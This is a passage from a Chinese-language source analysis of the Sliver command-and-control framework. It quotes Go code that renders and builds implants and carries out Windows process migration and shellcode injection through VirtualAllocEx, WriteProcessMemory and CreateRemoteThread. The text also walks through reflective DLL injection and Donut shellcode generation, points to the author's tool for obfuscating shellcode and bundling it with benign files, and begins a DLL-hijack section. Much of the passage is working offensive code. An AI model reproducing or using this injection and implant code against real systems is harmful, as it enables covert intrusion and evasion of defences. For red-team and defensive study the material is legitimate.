  if f.Name() == "sliver.go" || f.Name() == "sliver.c" || f.Name() == "sliver.h" { 
   sliverCodePath = filepath.Join(sliverPkgDir, f.Name()) 
  } else { 
   sliverCodePath = filepath.Join(sliverPkgDir, "implant", fsPath) 
  } 
  dirPath := filepath.Dir(sliverCodePath) 
  if _, err := os.Stat(dirPath); os.IsNotExist(err) { 
   buildLog.Debugf("[mkdir] %#v", dirPath) 
   err = os.MkdirAll(dirPath, 0700) 
   if err != nil { 
    return err 
   } 
  } 
  fSliver, err := os.Create(sliverCodePath) 
  if err != nil { 
   return err 
  } 
  buf := bytes.NewBuffer([]byte{}) 
  buildLog.Debugf("[render] %s -> %s", f.Name(), sliverCodePath) 
  // -------------- 
  // Render Code 
  // -------------- 
  sliverCodeTmpl := template.New("sliver") 
  sliverCodeTmpl, err = sliverCodeTmpl.Funcs(template.FuncMap{ 
   "GenerateUserAgent": func() string { 
    return configs.GetHTTPC2Config().GenerateUserAgent(config.GOOS, config.GOARCH) 
   }, 
  }).Parse(sliverGoCode) 
  if err != nil { 
   buildLog.Errorf("Template parsing error %s", err) 
   return err 
  } 
  err = sliverCodeTmpl.Execute(buf, struct { 
   Name                string 
   Config              *models.ImplantConfig 
   OTPSecret           string 
   HTTPC2ImplantConfig *configs.HTTPC2ImplantConfig 
  }{ 
sliver 简单使⽤及源码浅析
23
   name, 
   config, 
   otpSecret, 
   configs.GetHTTPC2Config().RandomImplantConfig(), 
  }) 
  if err != nil { 
   buildLog.Errorf("Template execution error %s", err) 
   return err 
  } 
  // Render canaries 
  buildLog.Debugf("Canary domain(s): %v", config.CanaryDomains) 
  canaryTmpl := template.New("canary").Delims("[[", "]]") 
  canaryGenerator := &CanaryGenerator{ 
   ImplantName:   name, 
   ParentDomains: config.CanaryDomainsList(), 
  } 
  canaryTmpl, err = canaryTmpl.Funcs(template.FuncMap{ 
   "GenerateCanary": canaryGenerator.GenerateCanary, 
  }).Parse(buf.String()) 
  if err != nil { 
   return err 
  } 
  err = canaryTmpl.Execute(fSliver, canaryGenerator) 
  if err != nil { 
   buildLog.Debugf("Failed to render go code: %s", err) 
   return err 
  } 
  return nil 
 }) 
 if err != nil { 
  return "", err 
 } 
 // Render GoMod 
 buildLog.Info("Rendering go.mod file ...") 
 goModPath := path.Join(sliverPkgDir, "go.mod") 
 err = ioutil.WriteFile(goModPath, []byte(implant.GoMod), 0600) 
 if err != nil { 
  return "", err 
 } 
 goSumPath := path.Join(sliverPkgDir, "go.sum") 
 err = ioutil.WriteFile(goSumPath, []byte(implant.GoSum), 0600) 
 if err != nil { 
  return "", err 
 } 
 // Render vendor dir 
 err = fs.WalkDir(implant.Vendor, ".", func(path string, d fs.DirEntry, err error) error { 
  if err != nil { 
   return err 
  } 
  if d.IsDir() { 
   return os.MkdirAll(filepath.Join(sliverPkgDir, path), 0700) 
  } 
  contents, err := implant.Vendor.ReadFile(path) 
  if err != nil { 
   return err 
  } 
  return os.WriteFile(filepath.Join(sliverPkgDir, path), contents, 0600) 
 }) 
 if err != nil { 
  buildLog.Errorf("Failed to copy vendor directory %v", err) 
  return "", err 
 } 
 buildLog.Debugf("Created %s", goModPath) 
 return sliverPkgDir, nil 
}
sliver 简单使⽤及源码浅析
24
// GoCmd - Execute a go command 
func GoCmd(config GoConfig, cwd string, command []string) ([]byte, error) { 
 goBinPath := filepath.Join(config.GOROOT, "bin", "go") 
 cmd := exec.Command(goBinPath, command...) 
 cmd.Dir = cwd 
 cmd.Env = []string{ 
  fmt.Sprintf("CC=%s", config.CC), 
  fmt.Sprintf("CGO_ENABLED=%s", config.CGO), 
  fmt.Sprintf("GOOS=%s", config.GOOS), 
  fmt.Sprintf("GOARCH=%s", config.GOARCH), 
  fmt.Sprintf("GOPATH=%s", config.ProjectDir), 
  fmt.Sprintf("GOCACHE=%s", config.GOCACHE), 
  fmt.Sprintf("GOMODCACHE=%s", config.GOMODCACHE), 
  fmt.Sprintf("GOPROXY=%s", config.GOPROXY), 
  fmt.Sprintf("HTTP_PROXY=%s", config.HTTPPROXY), 
  fmt.Sprintf("HTTPS_PROXY=%s", config.HTTPSPROXY), 
  fmt.Sprintf("PATH=%s:%s", filepath.Join(config.GOROOT, "bin"), os.Getenv("PATH")), 
 } 
 var stdout bytes.Buffer 
 var stderr bytes.Buffer 
 cmd.Stdout = &stdout 
 cmd.Stderr = &stderr 
 gogoLog.Infof("go cmd: '%v'", cmd) 
 err := cmd.Run() 
 if err != nil { 
  gogoLog.Infof("--- env ---\n") 
  for _, envVar := range cmd.Env { 
   gogoLog.Infof("%s\n", envVar) 
  } 
  gogoLog.Infof("--- stdout ---\n%s\n", stdout.String()) 
  gogoLog.Infof("--- stderr ---\n%s\n", stderr.String()) 
  gogoLog.Info(err) 
 } 
 return stdout.Bytes(), err 
}
shellcode怎么⽣成的
代码在 server/generate/binaries.go#257
注释⾥写使⽤ Donut 实现shellcode
Donut到底是啥
⽣成 x86、x64 或 AMD64+x86 位置⽆关的 shellcode，从内存中加载 .NET 程序集、PE ⽂件和其他 Windows 有效负载并使⽤参数运
⾏它们
https://github.com/TheWover/donut
然后我⽤这块的代码学习后写了⼀个⼩⼯具  https://github.com/Ciyfly/microwaveo
这个⼩⼯具可以将dll exe等转为shellcode 混淆shellcode后再赋予加载器 最后输出个exe
并且⽀持⽩⽂件的捆绑
那么我们就知道了怎么将dll exe等东⻄转成⼀个shellcode bin⽂件了
那么这个原始的输⼊在哪⾥呢 
就是上⾯的beacon ⽣成的exe来转shellcode
所以最后⽣成的shellcode或者exe都很⼤
CS的分阶段shellcode 是⽤汇编实现 代码很⼩
sliver 简单使⽤及源码浅析
25
另⼀种⽅式srdi
可以参考原理
https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/
反射dll注⼊
https://github.com/stephenfewer/ReflectiveDLLInjection
go实现的 srdi
https://gist.github.com/leoloobeek/c726719d25d7e7953d4121bd93dd2ed3
sliver⾥的go实现就是⽤的这段代码
server/generate/srdi.go
反射dll过程
1. 使⽤ RWX 权限打开⽬标进程并为 DLL 分配⾜够⼤的内存。 
2. 将 DLL 复制到分配的内存空间中。 
3. 计算 DLL 中的内存偏移量到⽤于进⾏反射加载的导出。 
4. 使⽤反射加载器函数的偏移地址作为⼊⼝点，调⽤CreateRemoteThread（或等效的未记录 API 函数，如）以在远程进程中开始执⾏。RtlCreateUserThread 
5. 反射加载器函数使⽤适当的 CPU 寄存器找到⽬标进程的进程环境块 (PEB)，并使⽤它来查找内存中的地址kernel32.dll和任何其他所需的库。 
6. 解析 kernel32 的 export ⽬录，找到所需 API 函数的内存地址，如LoadLibraryA、GetProcAddress、VirtualAlloc。 
7. 然后使⽤这些函数将 DLL（本⾝）正确加载到内存中并调⽤其⼊⼝点 DllMain。
LoadLibrary 只能从磁盘加载dll 通过c实现的LoadLibrary的版本 实现可以将任何dll操作
注⼊时 反射dll 将定位此函数的偏移量 并在其上放置⼀个线程
ReflectiveLoader 遍历内存以定位DLL的开头 然后⾃动解包并重新映射所有被裁 完成后会调⽤ DLLMain 并且你的恶意软件会在内存
中运⾏
⽬前sliver的shellcode⽣成是使⽤的dount
进程迁移怎么实现的
命令⾏ client/command/commands.go#1125
客户端请求 client/command/exec/migrate.go
beacon⾥实现  implant/sliver/taskrunner/task_windows.go#134
仅限于windows
利⽤ windows api DuplicateHandle 将当前进程句柄表中的⼀个表项 拷⻉到另⼀个进程的句柄表⾥
最后将shellcode注⼊到进程中
implant/sliver/taskrunner/task_windows.go#65 injectTask⽅法
1. 先指定进程中申请内存  syscalls.VirtualAllocEx
2. 将shellcode写⼊进去 syscalls.WriteProcessMemory
3. 设置适当的内存权限 syscalls.VirtualProtectEx
4. 创建远程线程调⽤shellcode syscalls.CreateRemoteThread
如下是迁移进程
sliver 简单使⽤及源码浅析
26
// RermoteTask - Injects Task into a processID using remote threads 
func RemoteTask(processID int, data []byte, rwxPages bool) error { 
 var lpTargetHandle windows.Handle 
 err := refresh() 
 if err != nil { 
  return err 
 } 
 processHandle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, false, uint32(processID)) 
 if processHandle == 0 { 
  return err 
 } 
 currentProcHandle, err := windows.GetCurrentProcess() 
 if err != nil { 
  // {{if .Config.Debug}} 
  log.Println("GetCurrentProcess failed") 
  // {{end}} 
  return err 
 } 
 err = windows.DuplicateHandle(processHandle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCE
 if err != nil { 
  // {{if .Config.Debug}} 
  log.Println("DuplicateHandle failed") 
  // {{end}} 
  return err 
 } 
 _, err = injectTask(lpTargetHandle, data, rwxPages) 
 if err != nil { 
  return err 
 } 
 return nil 
}
如下是进程注⼊
// injectTask - Injects shellcode into a process handle 
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) { 
 var ( 
  err          error 
  remoteAddr   uintptr 
  threadHandle windows.Handle 
 ) 
 dataSize := len(data) 
 // Remotely allocate memory in the target process 
 // {{if .Config.Debug}} 
 log.Println("allocating remote process memory ...") 
 // {{end}} 
 if rwxPages { 
  remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, 
 } else { 
  remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, 
 } 
 // {{if .Config.Debug}} 
 log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err) 
 // {{end}} 
 if err != nil { 
  // {{if .Config.Debug}} 
  log.Println("[!] failed to allocate remote process memory") 
  // {{end}} 
  return threadHandle, err 
 } 
 // Write the shellcode into the remotely allocated buffer 
 var nLength uintptr 
 err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength) 
 // {{if .Config.Debug}} 
 log.Printf("writeprocessmemory returned: err = %v", err) 
 // {{end}} 
 if err != nil { 
  // {{if .Config.Debug}} 
  log.Printf("[!] failed to write data into remote process") 
  // {{end}} 
  return threadHandle, err 
 } 
 if !rwxPages { 
sliver 简单使⽤及源码浅析
27
  var oldProtect uint32 
  // Set proper page permissions 
  err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect) 
  if err != nil { 
   //{{if .Config.Debug}} 
   log.Println("VirtualProtectEx failed:", err) 
   //{{end}} 
   return threadHandle, err 
  } 
 } 
 // Create the remote thread to where we wrote the shellcode 
 // {{if .Config.Debug}} 
 log.Println("successfully injected data, starting remote thread ....") 
 // {{end}} 
 attr := new(windows.SecurityAttributes) 
 var lpThreadId uint32 
 threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId) 
 // {{if .Config.Debug}} 
 log.Printf("createremotethread returned:  err = %v", err) 
 // {{end}} 
 if err != nil { 
  // {{if .Config.Debug}} 
  log.Printf("[!] failed to create remote thread") 
  // {{end}} 
  return threadHandle, err 
 } 
 return threadHandle, nil 
}
DLL Hijack
dll劫持
路径在 client/command/commands.go#3088
// [ DLL Hijack ] ----------------------------------------------------------------- 
 dllhijackCmd := &grumble.Command{ 
  Name:      consts.DLLHijackStr, 
  Help:      "Plant a DLL for a hijack scenario", 
  LongHelp:  help.GetHelpFor([]string{consts.DLLHijackStr}), 
  HelpGroup: consts.SliverWinHelpGroup, 
  Run: func(ctx *grumble.Context) error { 
   con.Println() 
   dllhijack.DllHijackCmd(ctx, con) 
   con.Println() 